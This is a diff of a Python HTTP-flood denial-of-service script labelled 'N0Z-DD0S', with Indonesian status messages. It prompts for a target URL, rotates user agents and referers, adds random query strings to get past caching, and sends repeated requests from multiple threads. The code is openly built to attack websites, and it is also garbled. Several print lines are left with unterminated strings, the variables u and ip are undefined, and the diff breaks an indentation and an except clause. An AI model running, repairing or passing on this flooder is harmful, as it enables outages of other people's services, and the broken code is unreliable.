@@ -7,7 +7,6 @@ import sys
 import random
 import string
 
-
 class bcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
@@ -23,12 +22,11 @@ class bcolors:
     UNDERLINE = '\033[4m'
     ZH = '\033[97m'
 
-
 if os.name == 'nt':
     os.system("cls")
 else:
     os.system("clear")
-print(" ")                                  
+    print(" ")                                  
 print("\033[31m            ©©      ©     ©© ©    © © © ©©   © © © ©©      \033[0m")
 print("\033[31m            ©© ©    ©   ©© • • ©  •    ©©    •    ©©       \033[0m")                 
 print("\033[31m            ©©  ©   ©   ©© • • ©      ©© •       ©© •      \033[0m")                 
@@ -45,7 +43,6 @@ print("\033[33m⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵�
 print("\033[32m-------------------------------->>>\033[0m")
 url = input("URL:  ").strip()
 
-
 count = 0
 headers = []
 referer = [
@@ -54,22 +51,21 @@ referer = [
     "https://alibaba.com/",
     "https://google.com/",
     "https://youtube.com",
-    ]
-
+    
+]
 
 
 def useragent():
     global headers
-      
     headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
     headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
     headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
     headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
     headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
     headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")
-    headers.append("Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11")
-    
+
     return headers
+
 
 def genstr(size):
     out_str = ''
@@ -79,6 +75,8 @@ def genstr(size):
         out_str += chr(code)
     
     return out_str
+
+
 class httpth1(threading.Thread):
     def run(self):
         global count
@@ -88,14 +86,11 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 count += 1
-                print ("{0}Sent.format(count))
-                print("\033[92m[\033[97m+\033[92m]\033[92mMENGIRIM PAKET: " +str(u)+ " \033[93mMEMATUK-MANGSA " +str()+ " \033[1m" +ip+ "\033[0m" )
-            except:
-                print (f"[+]\033[33m N0Z-DD0S  []\033[4m Request sent to  []\033[1m" +url+ " :' \033[0m".format(count))
+                print (".format(count))
+                print("[+]\033[92m[\033[97m\033[92m]\033[92mNOZZ: " +str(u)+ " \033[93mMENGIRUM-PAKET ke " +str()+ " \033[1m" +url+ "\033[0m" )
+       
             except requests.exceptions.ConnectionError:
-                
-                
-                print ("[Server maybe down!]")
+                print ("[Server might be down!]")
                 pass
             except requests.exceptions.InvalidSchema:
                 print ("[URL Error]")
